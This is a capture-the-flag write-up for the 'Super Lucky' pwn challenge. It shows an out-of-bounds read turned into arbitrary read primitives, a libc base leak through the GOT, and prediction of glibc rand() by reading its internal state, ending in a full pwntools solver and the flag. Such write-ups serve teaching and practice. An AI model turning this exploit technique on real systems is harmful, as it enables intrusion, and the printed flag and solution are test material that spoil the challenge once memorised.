https://ctftime.org/event/2238/

# Super Lucky ~ PWN

Just be super-duper lucky!

## Solution

### Abitary 4 Byte Read Primitive

We can see an out of bounds read on line 30 of super-lucky.c

```
for (int i = 0; i < 21; ++i) {
    unsigned long pick = 0;
    scanf("%lu", &pick);
    printf("Here's lucky number #%d: %d\n", i + 1, lucky_numbers[pick]);
}
```

We can supply numbers outside the range 0-776 in order to read 4 bytes at an abitary address as follows:

```
#include <stdio.h>

#define LUCKY_NUMBERS ( 0x00404040 )
#define PUTS_GOT ( 0x403f90 )

int main() {
    for ( ; ; ) {
        unsigned long pick = 0;
        scanf("%lu", &pick);
        printf("[%lx+%lx*4] => %lx\n",
            LUCKY_NUMBERS, pick, LUCKY_NUMBERS + (pick * 4));
    }

    return 0;
}
```

You can see in the following proof of concept that the resulting address matches that of `PUTS_GOT` defined above:

```
$ ./scanf_test 
-44
[404040+ffffffffffffffd4*4] => 403f90
-43
[404040+ffffffffffffffd5*4] => 403f94
```

This can be converted into a `read4` primitive, which can then be used to build a `read8` primitive, as follows:

```
LUCKY_NUMBERS = 0x00404040

def read4(addr):
    idx = (addr - LUCKY_NUMBERS) // 4
    io.sendline(str(idx).encode())
    return int(io.readline().decode().split(" ")[-1]) & 0xffffffff

def read8(addr):
    return read4(addr) | (read4(addr + 4) << 32)
```

Note that we can only perform up to 21 useful `read4` calls ( or 10 useful `read8` calls ) as a result of only being allowed to read 4 bytes 21 times.

### Getting LIBC Base

Using the `read8` primitive we created above its enough to simply read the value of `puts` from the GOT and compute the libc base address using the known `puts` symbol address from the version of libc used on the remote:

```
GOT_PUTS = 0x00403f90
puts = read8(GOT_PUTS)
libc = ELF("./libc.so.6")
libc.address = puts - libc.sym["puts"]
```

### Predicting The Output Of Rand

In order to get the flag we must predict correctly the output of 7 sequential calls to `rand` following a call to `srand` with an uknown seed.

To do this we have to use our read primitive, combined with knowledge about the current base address of libc, to leak the internal state of libc's prng. We can then use this to compute the series of values much like libc will do.

The state we are intersested in is stored in a table called `randtbl`. Note that the first value in the table indicates the type of prng behaviour in use. We can test for this `3` during exploit development to ensure that we have the correct address, and libc base, and that the remote is using `TYPE_3` as we expect.

https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/stdlib/random.c#L146

```
static int32_t randtbl[DEG_3 + 1] =
{
    TYPE_3,

    -1726662223, 379960547, 1735697613, 1040273694, 1313901226,
    1627687941, -179304937, -2073333483, 1780058412, -1989503057,
    -615974602, 344556628, 939512070, -1249116260, 1507946756,
    -812545463, 154635395, 1388815473, -1926676823, 525320961,
    -1009028674, 968117788, -123449607, 1284210865, 435012392,
    -2017506339, -911064859, -370259173, 1132637927, 1398500161,
    -205601318,
};
```

This table is stored within a structure called `unsafe_state`:

https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/stdlib/random.c#L160

```
static struct random_data unsafe_state =
{
    .fptr = &randtbl[SEP_3 + 1],
    .rptr = &randtbl[1],
    .state = &randtbl[1],
    .rand_type = TYPE_3,
    .rand_deg = DEG_3,
    .rand_sep = SEP_3,
    .end_ptr = &randtbl[sizeof (randtbl) / sizeof (randtbl[0])]
};
```

`unsafe_state` has a couple of pointers which point into `randtbl`. We are interested in `fptr` and `rptr` which initially point at index 4 and 1 respectively.

`__random_r` uses the `fptr` and `rptr` addresses from `unsafe_state` to walk through the values in `randtbl`. It will increment the value at `fptr` by the value at `rptr` and then return the top 31 bits from the result as the value of `rand`:

https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/stdlib/random_r.c#L370

```
int __random_r (struct random_data *buf, int32_t *result)
{
  int32_t *state;

  if (buf == NULL || result == NULL)
    goto fail;

  state = buf->state;

  if (buf->rand_type == TYPE_0)
    {
      int32_t val = ((state[0] * 1103515245U) + 12345U) & 0x7fffffff;
      state[0] = val;
      *result = val;
    }
  else
    {
      int32_t *fptr = buf->fptr;
      int32_t *rptr = buf->rptr;
      int32_t *end_ptr = buf->end_ptr;
      uint32_t val;

      val = *fptr += (uint32_t) *rptr;
      /* Chucking least random bit.  */
      *result = val >> 1;
      ++fptr;
      if (fptr >= end_ptr)
	{
	  fptr = state;
	  ++rptr;
	}
      else
	{
	  ++rptr;
	  if (rptr >= end_ptr)
	    rptr = state;
	}
      buf->fptr = fptr;
      buf->rptr = rptr;
    }
  return 0;

 fail:
  __set_errno (EINVAL);
  return -1;
}
```

After each call `fptr` and `rptr` are incremented by 4. We are only interested in the first 7 calls to `rand` so we don't have to worry about wrapping behaviour.

Attaching gdb and breaking after the call to `srand` we can see an example state for `randtbl`:

```
pwndbg> hexdump randtbl
+0000 0x7ffff7dfe200  03 00 00 00 ee 17 79 32  84 ea 9a 56 82 d2 fe 9d  │......y2│...V....│
+0010 0x7ffff7dfe210  23 b5 82 3e e0 f5 07 24  f7 95 7b 4d 8c 05 22 ed  │#..>...$│..{M..".│
+0020 0x7ffff7dfe220  ab 41 50 7a 91 98 ab ae  dd f6 7e 5c 7d 0d 0f a6  │.APz....│..~\}...│
+0030 0x7ffff7dfe230  8f c1 8d 48 15 56 f7 e2  ec cf a7 cd 9d 13 94 af  │...H.V..│........│
```

In this particular instance we can that there are currently a couple of references to this table in libc and one on the stack. Its not very useful for this exploit, as we have an abitary read and a libc base, however its maybe useful to note for the future.

```
pwndbg> search -t qword 0x7ffff7dfe204
Searching for value: b'\x04\xe2\xdf\xf7\xff\x7f\x00\x00'
libc.so.6       0x7ffff7dfe888 0x7ffff7dfe204
libc.so.6       0x7ffff7dfe890 0x7ffff7dfe204
[stack]         0x7fffffffda60 0x7ffff7dfe204
```

We can see the state of `fptr` and `rptr` after reseeding:

```
pwndbg> call srand(0)
pwndbg> x/2gx 0x7ffff7dfe880
0x7ffff7dfe880 <unsafe_state>:	0x00007ffff7dfe210	0x00007ffff7dfe204
pwndbg> x/32wx 0x7ffff7dfe200
0x7ffff7dfe200 <randtbl>:	0x00000003	0x991539b1	0x16a5bce3	0x6774a4cd
0x7ffff7dfe210 <randtbl+16>:	0x3e01511e	0x4e508aaa	0x61048c05	0xf5500617
0x7ffff7dfe220 <randtbl+32>:	0x846b7115	0x6a19892c	0x896a97af	0xdb48f936
0x7ffff7dfe230 <randtbl+48>:	0x14898454	0x37ffd106	0xb58bff9c	0x59e17104
0x7ffff7dfe240 <randtbl+64>:	0xcf918a49	0x09378c83	0x52c7a471	0x8d293ea9
0x7ffff7dfe250 <randtbl+80>:	0x1f4fc301	0xc3db71be	0x39b44e1c	0xf8a44ef9
0x7ffff7dfe260 <randtbl+96>:	0x4c8b80b1	0x19edc328	0x87bf4bdd	0xc9b240e5
0x7ffff7dfe270 <randtbl+112>:	0xe9ee4b1b	0x4382aee7	0x535b6b41	0xf3bec5da
```

In theory the next call to `rand` will perform the following computation based on the above:

```
>>> ((0x3e01511e + 0x991539b1) & 0xffffffff) >> 1
1804289383
```

We can see that indeed this is the result we expected:

```
pwndbg> call rand()
$19 = 1804289383
```

Looking again at the state of `fptr` and `rptr` we can see that both have advanced 4 bytes and only the state at `0x00007ffff7dfe210` has changed as a result of `*fptr += (uint32_t) *rptr;`:

```
pwndbg> x/2gx 0x7ffff7dfe880
0x7ffff7dfe880 <unsafe_state>:	0x00007ffff7dfe214	0x00007ffff7dfe208
pwndbg> x/32wx 0x7ffff7dfe200
0x7ffff7dfe200 <randtbl>:	0x00000003	0x991539b1	0x16a5bce3	0x6774a4cd
0x7ffff7dfe210 <randtbl+16>:	0xd7168acf	0x4e508aaa	0x61048c05	0xf5500617
0x7ffff7dfe220 <randtbl+32>:	0x846b7115	0x6a19892c	0x896a97af	0xdb48f936
0x7ffff7dfe230 <randtbl+48>:	0x14898454	0x37ffd106	0xb58bff9c	0x59e17104
0x7ffff7dfe240 <randtbl+64>:	0xcf918a49	0x09378c83	0x52c7a471	0x8d293ea9
0x7ffff7dfe250 <randtbl+80>:	0x1f4fc301	0xc3db71be	0x39b44e1c	0xf8a44ef9
0x7ffff7dfe260 <randtbl+96>:	0x4c8b80b1	0x19edc328	0x87bf4bdd	0xc9b240e5
0x7ffff7dfe270 <randtbl+112>:	0xe9ee4b1b	0x4382aee7	0x535b6b41	0xf3bec5da
```

### Solver

1) Leak the libc base address using the value of `puts.got`
2) Compute the location of `unsafe_state`
3) Read the value of `rptr` from `unsafe_state`
4) Use all of the remaining reads to read data starting from `randtbl[1]`. Note we only need the first 7 dwords
5) Provide the value of `rand` as a string 7 times by computing it using the table we read previously

```
from pwn import *

io = remote("tamuctf.com", 443, ssl=True, sni="super-lucky")

GOT_PUTS = 0x403f90
LUCKY_NUMBERS = 0x404040
UNSAFE_STATE = 0x1ba740

def read4(addr):
    idx = (addr - LUCKY_NUMBERS) // 4
    io.sendline(str(idx).encode())
    return int(io.readline().decode().split(" ")[-1]) & 0xffffffff

def read8(addr):
    return read4(addr) | (read4(addr + 4) << 32)

io.readuntil(b"Take your pick 0-777:\n")

puts = read8(GOT_PUTS)

libc = ELF("./libc.so.6")
libc.address = puts - libc.sym["puts"]

unsafe_state = libc.address + UNSAFE_STATE

rptr = read8(unsafe_state + 8)

randtbl = []
for i in range(17):
    randtbl.append(read4(rptr + (i * 4)))

for i in range(7):
    io.readline()
    randtbl[i + 3] = ((randtbl[i + 3] + randtbl[i]) & 0xffffffff)
    v = randtbl[i + 3] >> 1
    io.sendline(str(v).encode())

io.interactive(prompt="")
```

## Flag
`gigem{n0_on3_exp3ct5_the_l4gg3d_f1b0n4cc1}`
